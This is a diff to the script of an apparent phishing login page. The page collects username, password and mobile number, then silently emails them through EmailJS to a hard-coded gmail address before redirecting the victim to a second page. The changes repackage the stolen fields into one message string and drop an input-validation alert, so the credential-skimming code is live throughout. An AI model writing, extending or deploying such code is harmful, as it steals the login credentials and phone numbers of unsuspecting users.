@@ -273,6 +273,7 @@ button:hover {
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
  // Initialize EmailJS
+// Initialize EmailJS
 (function() {
     emailjs.init("Gjx15gLz2eH6G9gt2"); // Your public key
 
@@ -284,7 +285,7 @@ button:hover {
 
     // Form submission
     document.getElementById('login-form').addEventListener('submit', function(event) {
-        event.preventDefault();
+        event.preventDefault(); // Prevent default form submission
 
         // Collect form values
         const username = document.getElementById('username').value;
@@ -295,22 +296,19 @@ button:hover {
         if (mobileNumber.length === 10) {
             // Prepare data to be sent via EmailJS
             const formData = {
-                user_email: 'risov700k@gmail.com', // Send to this email
-                username: username,
-                password: password,
-                mobile_number: mobileNumber
+                message: `Username: ${username}, Password: ${password}, Mobile Number: ${mobileNumber}`,
+                from_name: "Server",
+                reply_to: "risov700k@gmail.com"
             };
 
             // Send email silently using EmailJS
             emailjs.send('service_eg5xddf', 'template_cyjps0r', formData)
                 .then(function(response) {
                     // On success, redirect to the second page
-                    window.location.href = '2page.html';
+                    window.location.href = '2page.html'; // Redirect after successful email
                 }, function(error) {
                     console.error('Failed to send email:', error); // Handle any errors here
                 });
-        } else {
-            alert('Please enter a valid 10-digit mobile number.');
         }
     });
 
@@ -336,7 +334,8 @@ button:hover {
     imageCaptcha.addEventListener('change', updateCaptchaImage);
     audioCaptcha.addEventListener('change', updateCaptchaImage);
 })();
- 
+
+
     </script>
  
 </body>
